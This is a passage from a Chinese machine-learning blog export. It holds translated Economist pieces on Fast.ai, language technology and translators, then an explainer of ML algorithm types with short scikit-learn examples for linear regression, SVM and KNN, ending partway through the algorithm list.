<h2 id="No-30-deep-voice-conversion-845-stars"><a href="#No-30-deep-voice-conversion-845-stars" class="headerlink" title="No.30 deep-voice-conversion [845 stars]"></a>No.30 deep-voice-conversion [845 stars]</h2><p><a href="https://github.com/andabi/deep-voice-conversion">deep-voice-conversion</a>: 支持语音转换的深度神经网络（声音风格转换），基于 Tensorflow<br>贡献者：<a href="https://medium.com/@dabiahn">Dabi Ahn</a>, AI Research at Kakao Brain</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/deep-voice-conversion.png" alt=""></p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="《The-Machine-Learning-Master》"><a href="#《The-Machine-Learning-Master》" class="headerlink" title="《The Machine Learning Master》"></a><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></h4><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-MLM-201803.png" alt=""></p>
<ul>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</a></li>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Projects/">Machine Learning:机器学习项目</a></li>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/04/02/Machine-Learning-Algorithms-Sheet/">Machine Learning:如何选择机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/05/07/Machine-Learning-Neural-Network">Machine Learning:神经网络基础</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/">Machine Learning:机器学习书单</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-News">Machine Learning:人工智能媒体报道集</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/">Machine Learning:机器学习技术与知识产权法</a></li>
<li><a href="https://riboseyim.github.io/2018/03/09/Machine-Learning-Economist/">Machine Learning:经济学家谈人工智能</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.infoq.com/cn/articles/deeplearning-for-IoT-bigdata-and-streaming-analytics?utm_campaign=infoq_content&amp;utm_source=infoq&amp;utm_medium=feed&amp;utm_term=global">深度学习在IoT大数据和流分析中的应用|InfoQ</a></li>
<li><a href="https://mp.weixin.qq.com/s/E4BVUI6xiWtgMwNR5ABfcA">腾讯冯牮：基于卷积神经网络在手机端实现文档检测 | 2017-10-03 QCon InfoQ</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>架构师</tag>
        <tag>Developer</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>AI产业资讯|经济学人报道合辑</title>
    <url>/2017/08/29/Machine-Learning-News/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>媒体报道|经济学人：No PhD, No Problem | 20181025</li>
<li>媒体报道|经济学人：译者的悲伤 | 20170527</li>
<li>媒体报道|经济学人：计算机如何学习人类语言？| 20170111</li>
</ul>
<span id="more"></span>
<h2 id="人物摘要"><a href="#人物摘要" class="headerlink" title="人物摘要"></a>人物摘要</h2><ul>
<li><a href="https://en.wikipedia.org/wiki/Jeremy_Howard">杰里米·霍华德（Jeremy Howard）</a>:数据科学家，Fast.ai 创始人</li>
<li><a href="https://www.linkedin.com/in/rachel-thomas-942a7923/">雷切尔·托马斯（Rachel Thomas）</a>:数学家，Fast.ai 创始人</li>
<li><a href="https://cs.stanford.edu/people/karpathy/">Andrei Karpathy</a>：director of artificial intelligence and Autopilot Vision at Tesla</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%90%B4%E6%81%A9%E8%BE%BE">吴恩达（ Andrew Ng ）</a>: 斯坦福/百度/deeplearning.ai</li>
</ul>
<h4 id="经济学人：人人都能构建智能软件"><a href="#经济学人：人人都能构建智能软件" class="headerlink" title="经济学人：人人都能构建智能软件"></a>经济学人：人人都能构建智能软件</h4><p>日期：2017年10月25日<br>标题：No PhD, No Problem<br>副标：New schemes teach the masses to build AI Treating it like a craft is paying dividends<br>来源：<a href="https://www.economist.com/business/2018/10/25/new-schemes-teach-the-masses-to-build-ai">https://www.economist.com/business/2018/10/25/new-schemes-teach-the-masses-to-build-ai</a></p>
<p>在过去的五年中，人工智能研究人员已经成为科技界的摇滚明星。深度学习（deep learning）是人工智能（artificial intelligence，AI）领域的一个分支 —— 基于神经网络探索大数据以实现模式识别能力。熟练掌握该方法构建软件的从业者可以在业界获得高达六位数的薪酬，包括亚马逊，苹果，Facebook 和谷歌等科技巨头。顶级专家年薪超过 100 万美元。</p>
<p>过去，进入人工智能领域的标准途径是从一所美国精英大学获得计算机科学博士学位。获得一个需要多年经验、并且适合学术界的职位，这些对于普通民众而言难以企及。研究生通常被有利可图的工作所吸引。</p>
<p>常识正在发生变化。今年十月，Fast.ai （一家位于旧金山的非盈利性教育机构）发布深度学习课程已经三周年。Fast.ai 自成立以来吸引了超过 10 万名学生，学生来源分布在全球各地，从印度到尼日利亚。与其他类似的课程一样，它们都有一个简单的主张：没有必要花费数年时间获得博士学位以实践深度学习。构建智能软件可以作为一种手艺来教学，而不是仅仅在象牙塔中进行的高智力游戏。 Fast.ai 的课程可在短短七周内完成。</p>
<p>数据科学家杰里米·霍华德（Jeremy Howard）与数学家雷切尔·托马斯（Rachel Thomas）一起创立 Fast.ai，他的目标是为了让任何想要知道如何构建智能软件的人都能够获得学习机会。他说学校的数学就足够了。</p>
<p><strong>Fast.ai</strong> 初见成效。Sara Hooker 之前从未从事过深度学习，在 Fast.ai 完成课程后毕业的第一年就被竞争激烈的 Google AI Residency Program 雇佣（2015 年创建，旨在培训和支持下一代深度学习研究人员）。她现在是位于加纳首都阿克拉的人工智能研究办公室的创始成员，该办事处是 Google  在非洲的第一家智能研究机构。在班加罗尔，约有 2,400 人是 ai Saturdays 的成员，他们作为一个巨大的研究小组一起跟随课程学习。<a href="https://cs.stanford.edu/people/karpathy/">Andrei Karpathy</a> （特斯拉自动驾驶仪视觉总监）是深度学习的最重要的从业者之一，他同样推荐这门课程。</p>
<p>Fast.ai 不是唯一的替代方案。 <strong>ai4all</strong> 是另一家非营利性企业，致力于为美国学童提供 AI 教育。吴恩达（ Andrew Ng ）是该领域的另一位知名人物（斯坦福大学计算机科学系和电气工程系副教授，斯坦福人工智能实验室主任，百度公司原首席科学家），他已经建立了自己的在线学习课程项目 deeplearning.ai 。</p>
<p>霍华德先生的雄心壮志远远超过畅通 AI 劳动力市场。他的目标是将深度学习方法传播到大众手中，以便该方法可以被尽可能多样化的人群应用于各种各样的领域。到目前为止，深度学习几乎由少数年轻的白人控制，几乎所有白人都受雇于科技巨头公司。霍华德先生雄心勃勃地表示，他的目标是让基于人工智能的软件变得像在智能手机上发送电子邮件一样易于使用、无处不在。</p>
<p>一些专家对此表示担忧。很有可能因此建造大量不可靠的人工智能系统，这些系统在理想的情况下是无用的，在最坏的情况下是危险的。回顾科技史可以消除这些担忧。在互联网早期阶段，只有少数具有特定技能的爱好者才能构建应用程序，同时也没有多少人使用这些应用程序。随后，万维网的发明导致了网页数量的爆炸式增长，且无论它们是好是坏。但是，只有开放的互联网才能实现在线购物、全球即时通信和搜索。如果霍华德先生和其他人能够找到他们的成功之路，将人工智能软件的开发变得更容易，就能给世界带来一种新的、不同以往的选择。</p>
<ul>
<li><a href="https://datascienceworkshops.com/workshops/">Data Science Workshops</a></li>
</ul>
<h4 id="经济学人：计算机如何学习人类语言？"><a href="#经济学人：计算机如何学习人类语言？" class="headerlink" title="经济学人：计算机如何学习人类语言？"></a>经济学人：计算机如何学习人类语言？</h4><p>日期：2017年1月11日<br>标题：How machines learned to speak human language<br>副标：And what does that mean for the way people use computers?<br>来源：[<a href="http://www.economist.com/blogs/economist-explains/2017/01/economist-explains-6">http://www.economist.com/blogs/economist-explains/2017/01/economist-explains-6</a>]</p>
<p>今年圣诞节数以百万计的人将得到一种装有电子设备的盒子——能够快速地提高使用人类语言的能力。亚马逊的 Echo 设备，配备了一个名为 Alexa 的数字助理，现在在500多万户家庭中出现。 Echo 是一个圆筒形的台式电脑，除了声音之外没有其它接口。你可以要求 Alexa 播报天气信息，播放音乐，预定出租车，告知通勤路程或讲一个老掉牙的笑话，它都会响应。来自美国电脑巨头的语音驱动式数字助理（谷歌的 Assistant、微软的 Cortana和苹果的 Siri）也已经取得了很大的进步。计算机是如何处理人类语言的问题呢？</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/NLP_Amazon_Echo.jpg" alt=""></p>
<p>曾经的想法是将教机器学习语言规则，例如翻译，使用一套语法规则来打破源语言的意义，再用另一组用来重现目标语言中的意思。但是经历过20世纪50年代的乐观情绪过后，业界发现这种系统不能用于复杂的新句子；基于语言规则的方法很难大规模扩展应用。用于人类语言识别技术的研究投资进入了长达几十年的蛰伏期，直到20世纪80年代的迎来复兴时期。[注：著名人工智能专家明斯基（达特茅斯会议的发起者之一）对美国科技决策部分产生了重大影响，自然科学基金会等对传统的自然语言处理研究资助大大减少。弗里德里克-贾里尼克（Frederick Jelinek)及其领导的 IBM 华生实验室（T.J.Watson) 在统计语言学取得关键突破。]</p>
<p>实际上，人类语言识别技术可以通过模式匹配的形式来自我学习。例如语音识别，计算机一边输入语音文件作为语料，另一边是人工编辑的译本作为的译本。系统学着预测这些语音的结果“听起来”应该属于那个译本。在翻译过程中，训练数据是源语言文本和人工翻译的文本。系统自主学习、匹配它们之间的模式。提高语音识别和翻译能力的一个因素是“语言模型”—— 一个关于英语句子的知识库。这大大缩小了系统的预测工作量。</p>
<p>最近有三件事使这种方法取得了巨大的飞跃：首先，计算机的运算能力比过去强大得多。第二，它们可以从海量的、日益增长的数据中学习，不管是在因特网上公开获取还是公司私下收集的。第三，所谓的“深度学习”（deep learning），它使用包括多层次的数字“神经元”及其连接的数字神经网络，使得该系统非常善于从例子中学习。</p>
<p>所有这一切都意味着，计算机现在非常善于回答具备明确定义的问题。例如 “明天伦敦的气温是多少？” （公平地说，你不必是一台电脑也能知道明天伦敦会下雨）。用户甚至可以用更自然的方式询问，比如“明天我应该带伞去伦敦吗？”（数字助理不断地从人们不同的提问方式中学习），但是问一个开放式的问题（“明天伦敦有什么有趣或者可以薅羊毛的事情吗？”）通常你只会得到一个来自搜索引擎结果的列表。</p>
<p>随着机器学习（ machine learning）的改进，当用户的智能设备更加熟悉他们时，这样的答案将变得更加有用。这意味着隐私倡导者的麻烦，但是参考过去几年手机应用的情况来看，消费者将作出权衡，他们通常非常高兴能获得新功能。</p>
<h4 id="经济学人：译者为何忧虑？"><a href="#经济学人：译者为何忧虑？" class="headerlink" title="经济学人：译者为何忧虑？"></a>经济学人：译者为何忧虑？</h4><p>日期：2017年5月27日<br>译者：LynnTra@经济学人翻译社<br>链接：<a href="http://www.jianshu.com/p/368f14a1e5b6">http://www.jianshu.com/p/368f14a1e5b6</a><br>來源：<a href="https://www.economist.com/news/books-and-arts/21722609-profession-under-pressure-why-translators-have-blues">https://www.economist.com/news/books-and-arts/21722609-profession-under-pressure-why-translators-have-blues</a></p>
<p>翻译(本文仅指笔译)可以是一份孤独的工作，这就很好地解释了为什么大多数翻译选择这项职业是出于自身兴趣，而不是关注度。不久之前，可以说一名合格译员都可以谋得一个稳定体面的生活，但是翻译行业正经历着扭曲的变革，让胆小者感受到谋生之艰。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/NLP_20170527_BKD001.jpg" alt=""></p>
<p>大多数翻译都是自由职业者，随着因特网的普及，一名合格译员可以入住在肯塔基州但服务于瑞士银行。但是网络互通也导致了激烈的全球竞争，随之即是大幅压价。译员们要么拼命多做或者抢酬劳高的活－这意味着实际翻译的时间少了－要么找一家能帮他们争取到任务的代理机构，但这意味着佣金抽取。除了自己单干或者和代理机构合作，译员还可以在线上市场宣传自身技能，但这暴露了最残忍的竞价压力：像译文千字 13-15 美金这么低的价格也不是没有。以前50美金左右就算低价翻译，那时候文学翻译大概是120美金，高价是250美金。在线上市场，几乎不懂外文和译文质量的买家几乎单纯按价格进行买卖。</p>
<p>职业压力还有另外一个出处：较高质量的机器翻译的涌现。仅仅是一年前，机器翻译的结果还不可靠：内容上不准确，且常不具可读性。而如今这两个缺陷都由基于所谓深度神经网络的翻译引擎大幅改善。几乎可以确定那些报特低价的译员们使用了翻译软件，然后直接针对译文的准确度和可读性进行快速编辑。总体来看，大的翻译机构都对这些科技和其广阔可能性拍手叫好。但是，另译员们本身感受担忧的是，自己的未来除了这种科技大清洗，智力上的愉悦感，别无其它了。对于所有现役译员来说，受影响者都不开心。为了避免成为“未来捡咖啡豆的人”，老译员建议提高专业领域知识和写作技能，以争取高端翻译。但并非人人都能做到。身在普遍性和中端市场的翻译们必然更多的是做编辑工作，否则就是被挤出局。</p>
<p>那剩下的翻译们何去何从呢？其一，文学翻译不受威胁。2001至2015年间，在英国，经翻译的小说售量上升了600％还不止，在美国也一直处于强劲增长中。像埃莱娜·费兰特（Elena Ferrante）这样的大作家也建议这些国家的读者们跳出自己的国度找好书。没人会相信一部机器可以翻译出一本小说。罗伊.雅各布森（Roy Jacobsen）的《看不见的事物》（Unseen）被列入2017年布克国际文学奖（Man Booker International Prize－MBIP）决选名单，原本的挪威岛方言经由唐.巴特利特（Don Bartlett）和唐.肖（Don Shaw）地道译出了带有同样风味的英文：“Hvur bitty it is!”（“How small it is!”“这个真是太小了！”）。MBIP让本书原作者和译者共享奖金，认可了翻译事实上是一种创作。</p>
<p>大多数翻译属于商业翻译，但那也属于一种创作。高管们常常否定一份讲稿或者一封信件的译文，因为那看起来不像他们的原作。但是一名好译员需要再度思考文章本身、重述重要篇章、分解或合并句段，如此等等。翻译软件可以做到准确，但它是逐句翻译。由于语言在考量句子好坏时基于不同的节奏、有不同的期待，因此软件效果可能是一团糟。所以翻译最好的办法只能是先思考原语所指深意，再重新创作。</p>
<p>另一个市场就是“译创”（transcreation），常见于广告业，这里要求译员重新思考一条信息，确保它在新语言（译语）中的版本具备正确的文化参照、笑点等诸如此类，来复刻原语的影响力，跳出语言本身。在这种情况下，“译创员”相比大多数译员来说，更是一名原创作者。</p>
<p>正在被科技重塑的翻译工作很难是一项孤独的工作了。法律、会计以及其它很多可敬的工作正见证着重复性脑力工作由机器完成，效果差强人意。未来的翻译想要做得真好，需要的不仅仅是语言和写作技能，还必须获得客户信任、站在客户角度考虑，就像律所或者会计所的合伙人。换句话说，翻译行业里的孤独者可能举步维艰了。</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="《The-Machine-Learning-Master》"><a href="#《The-Machine-Learning-Master》" class="headerlink" title="《The Machine Learning Master》"></a><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></h4><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-MLM-201803.png" alt=""></p>
<ul>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</a></li>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Projects/">Machine Learning:机器学习项目</a></li>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/04/02/Machine-Learning-Algorithms-Sheet/">Machine Learning:如何选择机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/05/07/Machine-Learning-Neural-Network">Machine Learning:神经网络基础</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/">Machine Learning:机器学习书单</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-News">Machine Learning:人工智能媒体报道集</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/">Machine Learning:机器学习技术与知识产权法</a></li>
<li><a href="https://riboseyim.github.io/2018/03/09/Machine-Learning-Economist/">Machine Learning:经济学家谈人工智能</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NzQwNjcyMQ==&amp;mid=217093482&amp;idx=1&amp;sn=5f21c839968e588505d60fcba8d80a1a&amp;scene=1#rd">如何创造像样的人造语言 | 大象公会</a></li>
<li><a href="http://www.infoq.com/cn/news/2017/08/Machine-learning-Google-ranslati?utm_campaign=infoq_content&amp;utm_source=infoq&amp;utm_medium=feed&amp;utm_term=global">机器学习翻译和谷歌翻译算法 | Daniil Korbut (Junior Data Scientist at Statsbot)</a></li>
<li><a href="https://mp.weixin.qq.com/s/KHtBgloA8ZwbKPuBvpyYHQ">利用机器学习技术监测集约型畜牧业 | 《自然-可持续性》 | 原创： Nature自然科研  Nature自然科研  4月9日</a></li>
<li><a href="https://mp.weixin.qq.com/s/b8LOpaNWn-yjPAAE-xlJ6A">机器人会得抑郁症吗？ | 原创： Zachary Mainen  酷炫脑  2018-05-03</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Economist</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine-Learning-TensorFlow-ProtoBuf</title>
    <url>/2018/03/20/Machine-Learning-TensorFlow-ProtoBuf/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><span id="more"></span>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://medium.com/@dboyliao/%E7%B0%A1%E4%BB%8B-google-protocol-buffer-1dd5fa2e1e69">簡介 Google Protocol Buffer</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/31308381">Tensorflow框架实现中的“三”种图</a></li>
<li><a href="http://blog.csdn.net/huachao1001/article/details/78502910">Tensorflow将模型导出为一个文件及接口设置</a></li>
<li><a href="https://towardsdatascience.com/how-to-use-dataset-in-tensorflow-c758ef9e4428">How to use Dataset in TensorFlow| The built-in Input Pipeline. Never use ‘feed-dict’ anymore</a></li>
<li><a href="https://towardsdatascience.com/deploy-tensorflow-models-9813b5a705d5">Deploy TensorFlow models | Super fast and concise tutorial</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>AI技术原理|机器学习算法</title>
    <url>/2018/02/10/Machine-Learning-Algorithms/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>机器学习算法分类：监督学习、半监督学习、无监督学习、强化学习</li>
<li>基本的机器学习算法：线性回归、支持向量机(SVM)、最近邻居(KNN)、逻辑回归、决策树、k平均、随机森林、朴素贝叶斯、降维、梯度增强</li>
<li>公式、图示、案例</li>
</ul>
<span id="more"></span>
<h2 id="机器学习算法分类"><a href="#机器学习算法分类" class="headerlink" title="机器学习算法分类"></a>机器学习算法分类</h2><p>机器学习算法大致可以分为：</p>
<ul>
<li>监督学习 | Supervised learning</li>
<li>半监督学习 | Semi-supervised learning</li>
<li>无监督学习 | Unsupervised learning</li>
<li>强化学习 | Reinforcement learning</li>
</ul>
<p><img src="https://semiengineering.com/wp-content/uploads/2018/06/Machine-Learning-Algorithms-2.jpg.png" alt="Machine-Learning-Algorithms"></p>
<h4 id="监督学习-Supervised-learning"><a href="#监督学习-Supervised-learning" class="headerlink" title="监督学习 | Supervised learning"></a>监督学习 | Supervised learning</h4><p>监督学习算法基于一组示例进行预测。在监督学习训练过程中，可以由训练数据集学到或建立一个模式（函数 / learning model），并依此模式推测新的实例。</p>
<p>监督学习算法要求特定的输入/输出，一个常见的例子是根据当年和前几年的销售情况估算下一年的销售额。首先需要决定 <strong>使用哪种数据作为范例</strong>。例如，文字识别应用中一个手写的字符，或一行手写文字。监督学习主要算法包括神经网络、支持向量机、最近邻居法、朴素贝叶斯法、决策树等。</p>
<ul>
<li>分类（Classification）：当数据被用于预测分类变量时，监督学习也被称为分类。为图像分配标签或指示器（例如狗或猫）时就是这种情况。当只有两个标签时，这称为二进制分类（ binary classification）。当有两个以上的类别时，这些问题被称为多级分类（multi-class classification）。</li>
<li>回归（Regression）：当我们需要预测连续值时，就变成了回归问题。</li>
<li>预测（Forecasting）：根据过去和现在的数据对未来进行预测的过程。它最常用于分析趋势。</li>
</ul>
<h4 id="半监督学习-Semi-supervised-learning"><a href="#半监督学习-Semi-supervised-learning" class="headerlink" title="半监督学习 | Semi-supervised learning"></a>半监督学习 | Semi-supervised learning</h4><p>监督学习带来的挑战是标签数据可能非常昂贵而且耗时。如果标签有限，可以使用未标记的示例来增强监督式学习。因为在这种情况下机器没有完全监督，所以我们说机器是半监督的。使用半监督学习，您可以使用带有少量标签数据的未标记示例来提高学习的准确性。</p>
<h4 id="无监督学习-Unsupervised-learning"><a href="#无监督学习-Unsupervised-learning" class="headerlink" title="无监督学习 | Unsupervised learning"></a>无监督学习 | Unsupervised learning</h4><p>无监督学习算法没有特定的目标输出，算法将数据集分为不同的组。</p>
<p>在进行无监督学习时，机器会显示完全未标记的数据。它要求发现数据基础的内在模式，例如聚类结构（clustering structure），低维流形（a low-dimensional manifold）或稀疏树（sparse tree ）和图（graph）。</p>
<ul>
<li>聚类（Clustering）：对一组数据示例进行分组，使一个组（或一个聚类）中的示例与其他组中的示例更相似（根据某些标准）。这通常用于将整个数据集分成几个组。可以在每个组中进行分析以帮助用户找到固有模式。</li>
<li>降维（Dimension reduction）：减少需要考虑的变量数量。在许多应用中，原始数据具有非常高的维度特征，并且一些特征对于任务是多余的或不相关的。降维有助于找到数据内在真实的、潜在的关系。</li>
</ul>
<h4 id="强化学习-Reinforcement-learning"><a href="#强化学习-Reinforcement-learning" class="headerlink" title="强化学习 | Reinforcement learning"></a>强化学习 | Reinforcement learning</h4><p>强化学习强调通过基于环境的反馈行为分析、优化以取得最佳预期。机器尝试不同的场景来发现哪些行为能产生最大的回报，而不是被告知要采取何种行动。反复试验（Trial-and-error）和延迟奖励（delayed reward）是将强化学习与其他技术区分开来的关键。</p>
<p>强化学习普适性强，主要基于决策进行训练，算法根据输出结果（决策）的成功或错误来训练自己，通过大量经验训练优化后的算法将能够给出较好的预测。类似有机体在环境给予的奖励或惩罚的刺激下，逐步形成对刺激的预期，产生能获得最大利益的习惯性行为。在运筹学和控制论的语境下，强化学习被称作“近似动态规划”（approximate dynamic programming，ADP）。</p>
<h2 id="机器学习算法列表"><a href="#机器学习算法列表" class="headerlink" title="机器学习算法列表"></a>机器学习算法列表</h2><ul>
<li>线性回归算法 Linear Regression</li>
<li>支持向量机算法 (Support Vector Machine,SVM)</li>
<li>最近邻居/k-近邻算法 (K-Nearest Neighbors,KNN)</li>
<li>逻辑回归算法 Logistic Regression</li>
<li>决策树算法 Decision Tree</li>
<li>k-平均算法 K-Means</li>
<li>随机森林算法 Random Forest</li>
<li>朴素贝叶斯算法 Naive Bayes</li>
<li>降维算法 Dimensional Reduction</li>
<li>梯度增强算法 Gradient Boosting</li>
</ul>
<h2 id="1-线性回归算法-Linear-Regression"><a href="#1-线性回归算法-Linear-Regression" class="headerlink" title="1. 线性回归算法 Linear Regression"></a>1. 线性回归算法 Linear Regression</h2><p>回归分析（Regression Analysis）是统计学的数据分析方法，目的在于了解两个或多个变量间是否相关、相关方向与强度，并建立数学模型以便观察特定变量来预测其它变量的变化情况。</p>
<p>线性回归算法（Linear Regression）的建模过程就是使用数据点来寻找最佳拟合线。公式，y = m<em>x + c，其中 y 是因变量，x 是自变量，利用给定的数据集求 m 和 c 的值。<br>线性回归又分为两种类型，即 <strong>简单线性回归（simple linear regression)</strong>，只有 1 个自变量；<em>*多变量回归（multiple regression)</em></em>，至少两组以上自变量。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML_Alg_LR.png" alt=""> <img src="http://riboseyim-qiniu.riboseyim.com/ML_Alg_Linear_Regression_2.jpg" alt=""></p>
<p>下面是一个线性回归示例：基于 Python scikit-learn 工具包描述。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> linear_model, datasets</span><br><span class="line"></span><br><span class="line"><span class="comment">#digit dataset from sklearn</span></span><br><span class="line">digits = datasets.load_digits()</span><br><span class="line"><span class="comment">#create the LinearRegression model</span></span><br><span class="line">clf = linear_model.LinearRegression()</span><br><span class="line"></span><br><span class="line"><span class="comment">#set training set</span></span><br><span class="line">x, y = digits.data[:-<span class="number">1</span>], digits.target[:-<span class="number">1</span>]</span><br><span class="line"><span class="comment">#train model</span></span><br><span class="line">clf.fit(x, y)</span><br><span class="line"></span><br><span class="line"><span class="comment">#predict</span></span><br><span class="line">y_pred = clf.predict([digits.data[-<span class="number">1</span>]])</span><br><span class="line">y_true = digits.target[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(y_pred)</span><br><span class="line"><span class="built_in">print</span>(y_true)</span><br></pre></td></tr></table></figure>
<h2 id="2-支持向量机算法-Support-Vector-Machine-SVM"><a href="#2-支持向量机算法-Support-Vector-Machine-SVM" class="headerlink" title="2. 支持向量机算法(Support Vector Machine,SVM)"></a>2. 支持向量机算法(Support Vector Machine,SVM)</h2><p>支持向量机/网络算法(SVM)属于分类型算法。SVM模型将实例表示为空间中的点，将使用一条直线分隔数据点。需要注意的是，支持向量机需要对输入数据进行完全标记，仅直接适用于两类任务，应用将多类任务需要减少到几个二元问题。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML_Alg_SVM.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML_Alg_SupportVectorMachine.jpg" alt=""></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> svm, datasets</span><br><span class="line"></span><br><span class="line"><span class="comment">#digit dataset from sklearn</span></span><br><span class="line">digits = datasets.load_digits()</span><br><span class="line"></span><br><span class="line"><span class="comment">#create the  Support Vector Classifier</span></span><br><span class="line">clf = svm.SVC(gamma = <span class="number">0.001</span>, C = <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#set training set</span></span><br><span class="line">x, y = digits.data[:-<span class="number">1</span>], digits.target[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#train model</span></span><br><span class="line">clf.fit(x, y)</span><br><span class="line"></span><br><span class="line"><span class="comment">#predict</span></span><br><span class="line">y_pred = clf.predict([digits.data[-<span class="number">1</span>]])</span><br><span class="line">y_true = digits.target[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(y_pred)</span><br><span class="line"><span class="built_in">print</span>(y_true)</span><br></pre></td></tr></table></figure>
<h2 id="3-最近邻居-k-近邻算法-K-Nearest-Neighbors-KNN"><a href="#3-最近邻居-k-近邻算法-K-Nearest-Neighbors-KNN" class="headerlink" title="3. 最近邻居/k-近邻算法 (K-Nearest Neighbors,KNN)"></a>3. 最近邻居/k-近邻算法 (K-Nearest Neighbors,KNN)</h2><p>KNN算法是一种基于实例的学习，或者是局部近似和将所有计算推迟到分类之后的惰性学习。用最近的邻居（k）来预测未知数据点。k 值是预测精度的一个关键因素，无论是分类还是回归，衡量邻居的权重都非常有用，较近邻居的权重比较远邻居的权重大。</p>
<p>KNN 算法的缺点是对数据的局部结构非常敏感。计算量大，需要对数据进行规范化处理，使每个数据点都在相同的范围。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML_Alg_KNN.gif" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML_Alg_NearestNeighbors.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"></span><br><span class="line"><span class="comment">#digit dataset from sklearn</span></span><br><span class="line">digits = datasets.load_digits()</span><br><span class="line"></span><br><span class="line"><span class="comment">#create the  KNeighborsClassifier</span></span><br><span class="line">clf = KNeighborsClassifier(n_neighbors=<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#set training set</span></span><br><span class="line">x, y = digits.data[:-<span class="number">1</span>], digits.target[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#train model</span></span><br><span class="line">clf.fit(x, y)</span><br><span class="line"></span><br><span class="line"><span class="comment">#predict</span></span><br><span class="line">y_pred = clf.predict([digits.data[-<span class="number">1</span>]])</span><br><span class="line">y_true = digits.target[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(y_pred)</span><br><span class="line"><span class="built_in">print</span>(y_true)</span><br></pre></td></tr></table></figure>
